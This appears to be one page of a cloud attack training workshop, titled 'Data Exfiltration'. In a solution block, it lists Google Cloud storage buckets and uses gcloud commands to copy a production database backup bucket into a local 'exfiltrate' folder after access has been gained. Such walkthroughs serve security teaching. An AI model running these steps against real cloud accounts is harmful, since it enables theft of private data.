---
title: Data Exfiltration
weight: 42
---

Now that we have access and seen that there are storage buckets, we can exfiltrate data.

The database backup in the Storage sounds to be interesting. Why not try to download it?!

Well it has disabled public access, however since we are already in, that doesn't prevent us from accessing it. So let's download it:

{{% expand "Solution" %}}

```bash
gcloud storage buckets list | grep id
```

```bash
mkdir -p /root/demotalk/exfiltrate
cd /root/demotalk/exfiltrate
```

```bash
gcloud storage cp -r gs://conduit-database-backup-prod/ .
```

{{% /expand %}}
